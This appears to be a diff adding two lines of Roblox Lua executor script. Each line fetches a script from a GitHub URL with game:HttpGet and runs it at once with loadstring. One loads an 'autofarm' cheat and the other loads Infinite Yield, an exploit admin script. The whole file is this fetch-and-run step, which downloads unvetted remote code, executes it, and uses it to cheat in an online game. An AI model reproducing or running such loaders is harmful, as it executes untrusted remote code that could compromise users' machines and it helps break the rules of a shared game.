@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://githubusercontent.com/SpringFams629/scripts/refs/heads/main/autofarm"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
